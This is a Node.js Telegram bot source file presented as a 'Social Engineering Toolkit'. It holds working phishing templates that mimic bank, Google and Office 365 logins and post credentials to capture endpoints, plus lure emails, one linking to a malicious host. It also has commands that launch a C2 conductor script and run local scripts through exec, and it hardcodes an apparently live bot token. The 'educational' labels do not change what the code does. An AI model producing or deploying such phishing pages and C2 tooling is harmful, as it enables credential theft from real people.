const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const https = require('https');

// Force IPv4 for Axios requests
axios.defaults.httpsAgent = new https.Agent({ family: 4 });

// Configuration
// Using the same token/owner from telegram_nmap_bot.js for convenience in this test environment.
const BOT_TOKEN = '7972529532:AAFXWYOD7Xmt9MCPTA1aGnlzIRyEQ9ZJnMU'; 
const OWNER_ID = 8569895826;

// Create an Agent to force IPv4
const agent = new https.Agent({ family: 4 });

const bot = new Telegraf(BOT_TOKEN, {
    telegram: { agent: agent }
});

// --- State Management (Simple In-Memory) ---
const userState = {};
let c2Process = null;

// --- Helper Functions ---

const isOwner = (ctx) => {
    return ctx.from && ctx.from.id === OWNER_ID;
};

const runLocalCommand = (ctx, command, description) => {
    ctx.reply(`⏳ Executing ${description}...`);
    const { exec } = require('child_process');
    exec(command, { maxBuffer: 1024 * 1024 * 5 }, (err, stdout, stderr) => {
        const output = (stdout || stderr || "No output.").slice(0, 3500);
        ctx.replyWithHTML(`<b>📄 ${description} Output:</b>\n<pre>${output}</pre>`);
    });
};

// --- Phishing Templates (Theoretical/Educational) ---
const TEMPLATES = {
    'login': {
        name: 'Bank Login',
        content: `
<!DOCTYPE html>
<html>
<head>
    <title>Secure Login</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Secure Banking</h2>
        <form action="/capture" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>`
    },
    'urgent': {
        name: 'Urgent Update Email',
        content: `
Subject: ACTION REQUIRED: Account Security Alert

Dear User,

We detected unusual activity on your account. To prevent suspension, please verify your identity immediately.

[ Verify Now ]( http://malicious-link.com/verify )

If you do not complete this verification within 24 hours, your account will be locked.

Security Team
`
    },
    'prize': {
        name: 'Prize Claim',
        content: `
CONGRATULATIONS!

You have been selected as the winner of a brand new iPhone 16 Pro Max!

Click below to claim your prize before it expires in 5 minutes!

[ CLAIM PRIZE ]

(Note: This requires shipping payment of $1.99)
`
    },
    'google': {
        name: 'Google Login',
        content: `
<!DOCTYPE html>
<html>
<head><title>Sign in - Google Accounts</title></head>
<body>
    <div style="width: 350px; margin: 50px auto; border: 1px solid #ccc; padding: 20px;">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="100">
        <h3>Sign in</h3>
        <p>Use your Google Account</p>
        <form action="/google-capture" method="POST">
            <input type="email" name="email" placeholder="Email or phone" style="width:100%; margin:10px 0; padding:8px;">
            <input type="password" name="password" placeholder="Enter your password" style="width:100%; margin:10px 0; padding:8px;">
            <button type="submit" style="background:#1a73e8; color:white; border:none; padding:10px 20px; cursor:pointer;">Next</button>
        </form>
    </div>
</body>
</html>`
    },
    'microsoft': {
        name: 'Office 365 Login',
        content: `
<!DOCTYPE html>
<html>
<head><title>Sign in to your account</title></head>
<body>
    <div style="width: 400px; margin: 100px auto; background: white; border: 1px solid #eaeaea; padding: 40px;">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9629c6684212ad570d1a1ade46.svg" width="110">
        <h2 style="font-weight: 500;">Sign in</h2>
        <form action="/ms-capture" method="POST">
            <input type="email" name="loginfmt" placeholder="Email, phone, or Skype" style="width:100%; margin:10px 0; padding:10px; border:0; border-bottom:1px solid black;">
            <p>No account? <a href="#">Create one!</a></p>
            <button type="submit" style="background:#0067b8; color:white; width:100px; padding:10px; border:none; float:right;">Next</button>
        </form>
    </div>
</body>
</html>`
    }
};

// --- Bot Commands ---

bot.start((ctx) => {
    if (!isOwner(ctx)) return ctx.reply("🚫 Access Denied.");
    
    ctx.replyWithHTML(`
<b>🕵️‍♂️ SOCIAL ENGINEERING TOOLKIT (SET) 🕵️‍♂️</b>

<b>Identity:</b>
/email - Generate Disposable Email (1secmail)
/check &lt;email&gt; - Check Inbox
/sms   - Generate Virtual SMS Number (Demo)

<b>Phishing Templates (Edu):</b>
/phish login   - Fake Bank Login (HTML)
/phish google  - Google Account Login
/phish microsoft - Office 365 Login
/phish urgent  - Urgent Email Text

<b>Overseer (C2 & System):</b>
/c2 start      - Launch C2 Conductor
/status        - System Load & Memory
/kali          - List Kali Home Tools
/run &lt;script&gt;  - Execute Home Script (e.g. /run tg_messages.js)

<i>"Reality is what you can get away with."</i>
    `);
});

bot.command('status', (ctx) => {
    if (!isOwner(ctx)) return;
    const os = require('os');
    const load = os.loadavg();
    const freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const uptime = (os.uptime() / 3600).toFixed(2);

    ctx.replyWithHTML(`
<b>📊 System Status:</b>
<b>Uptime:</b> ${uptime} hours
<b>Load Avg:</b> ${load[0].toFixed(2)}, ${load[1].toFixed(2)}, ${load[2].toFixed(2)}
<b>Memory:</b> ${freeMem}GB / ${totalMem}GB free
<b>Platform:</b> ${os.platform()} (${os.arch()})
    `);
});

// --- Overseer & Kali Modules ---

bot.command('c2', (ctx) => {
    if (!isOwner(ctx)) return;
    const { exec, spawn } = require('child_process');
    const action = ctx.message.text.split(' ')[1];

    if (action === 'start') {
        if (c2Process) return ctx.reply("⚠️ C2 Conductor is already running.");
        
        ctx.reply("🚀 Starting C2 Conductor (Python)...");
        c2Process = spawn('python3', ['/home/korri/c2_conductor.py']);
        
        c2Process.stdout.on('data', (data) => console.log(`[C2 STDOUT] ${data}`));
        c2Process.stderr.on('data', (data) => console.log(`[C2 STDERR] ${data}`));
        
        c2Process.on('close', (code) => {
            console.log(`[C2] Process exited with code ${code}`);
            c2Process = null;
        });

        ctx.reply("✅ C2 Conductor is now listening on 127.0.0.1:65432");
    } else if (action === 'status') {
        if (c2Process) {
            ctx.reply("🟢 C2 Conductor: ACTIVE (PID: " + c2Process.pid + ")");
        } else {
            ctx.reply("🔴 C2 Conductor: INACTIVE");
        }
    } else {
        ctx.reply("Usage: /c2 start | status");
    }
});

bot.command('kali', (ctx) => {
    if (!isOwner(ctx)) return;
    runLocalCommand(ctx, 'ls -F /home/korri/', 'Kali Home Directory');
});

bot.command('run', (ctx) => {
    if (!isOwner(ctx)) return;
    const script = ctx.message.text.split(' ')[1];
    if (!script) return ctx.reply("Usage: /run <script_name>");
    
    if (script.endsWith('.js')) {
        runLocalCommand(ctx, `node /home/korri/${script}`, `Script: ${script}`);
    } else if (script.endsWith('.py')) {
        runLocalCommand(ctx, `python3 /home/korri/${script}`, `Script: ${script}`);
    } else {
        ctx.reply("❌ Unsupported script type. Use .js or .py");
    }
});

bot.command('phish', (ctx) => {
    if (!isOwner(ctx)) return;

    const args = ctx.message.text.split(' ');
    const type = args[1];

    if (TEMPLATES[type]) {
        ctx.replyWithHTML(`<b>📄 Template: ${TEMPLATES[type].name}</b>`);
        ctx.reply(`

${TEMPLATES[type].content}

`, { parse_mode: 'MarkdownV2' });
    } else {
        ctx.reply("❌ Unknown template. Types: login, urgent, prize");
    }
});

// --- Disposable Email (SIMULATION MODE) ---
// The external API is blocking our IP. We are switching to Local Simulation.

bot.command('email', async (ctx) => {
    if (!isOwner(ctx)) return;

    const domains = ['secure-mail.org', 'temp-inbox.net', 'ghost-mail.io'];
    const randomUser = Math.random().toString(36).substring(7);
    const domain = domains[Math.floor(Math.random() * domains.length)];
    const email = `${randomUser}@${domain}`;
    
    ctx.replyWithHTML(`
📧 <b>New Identity Created (SIMULATION):</b>
<code>${email}</code>

<b>Status:</b> 🟢 Active (Local Relay)
<b>Note:</b> This is a simulated identity for testing flows.
Use /check ${email} to view simulated incoming traffic.
    `);
});

bot.command('check', async (ctx) => {
    if (!isOwner(ctx)) return;

    const args = ctx.message.text.split(' ');
    const email = args[1]; 

    if (!email) return ctx.reply("Usage: /check <email_address>");

    // Simulation Data
    const messages = [
        { id: 101, from: 'security@google-alert.com', subject: 'Critical Security Alert', date: 'Just now' },
        { id: 102, from: 'verify@paypal-support.net', subject: 'Confirm your payment of $999.00', date: '5 mins ago' },
        { id: 103, from: 'admin@work-portal.org', subject: 'Reset your password immediately', date: '1 hour ago' }
    ];

    let msgList = `<b>📬 Inbox for ${email} (SIMULATED):</b>\n\n`;
    for (const msg of messages) {
        msgList += `<b>ID:</b> ${msg.id}\n<b>From:</b> ${msg.from}\n<b>Subject:</b> ${msg.subject}\n/read ${email} ${msg.id}\n\n`;
    }
    ctx.replyWithHTML(msgList);
});

bot.command('read', async (ctx) => {
    if (!isOwner(ctx)) return;

    const args = ctx.message.text.split(' ');
    const id = args[2];

    const bodies = {
        '101': "We detected a new login from Moscow, Russia. If this wasn't you, click here immediately.",
        '102': "You sent $999.00 USD to unknown_user. Transaction ID: #9928382. Click to dispute.",
        '103': "Your password expires in 24 hours. Please update it on the corporate portal."
    };

    const content = bodies[id] || "Encrypted content... (Simulation placeholder)";

    ctx.replyWithHTML(
        `
<b>Subject:</b> [SIMULATION] Message ID ${id}

<b>Body:</b>
${content}
        `);
});

// --- Disposable SMS (Mock/Demo) ---
bot.command('sms', (ctx) => {
    if (!isOwner(ctx)) return;

    // In a real scenario, this would call an API like smspva.com or receive-smss.com
    // For this educational bot, we generate a "Demo" number.
    const countryCodes = ['+1', '+44', '+7', '+86'];
    const randomCode = countryCodes[Math.floor(Math.random() * countryCodes.length)];
    const randomNumber = Math.floor(1000000000 + Math.random() * 9000000000);
    const fullNumber = `${randomCode} ${randomNumber}`;

    ctx.replyWithHTML(
        `
📱 <b>Virtual Number Generated (DEMO)</b>
<b>Number:</b> <code>${fullNumber}</code>
<b>Service:</b> Global VoIP
<b>Status:</b> 🟢 Online (Waiting for SMS...)

<i>Note: This is a simulation. Real SMS interception requires paid API keys (e.g., SMSPVA, 5sim).</i>
    `);
});

// --- Launch ---
console.log("[-] Social Engineering Bot Starting...");
console.log("[*] Token check: " + BOT_TOKEN.split(':')[0] + ":[REDACTED]");
console.log("[*] Connecting to Telegram API...");

bot.launch().then(() => {
    console.log("[+] Social Engineering Bot Online!");
    console.log("[*] Bot Username: " + bot.botInfo.username);
}).catch((err) => {
    console.error("[!] Failed to launch:", err);
    if (err.message.includes("401")) {
        console.error("[!] Error 401: Unauthorized. Check your BOT_TOKEN.");
    } else if (err.code === 'ETIMEDOUT') {
        console.error("[!] Connection timed out. Check your internet or proxy.");
    }
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
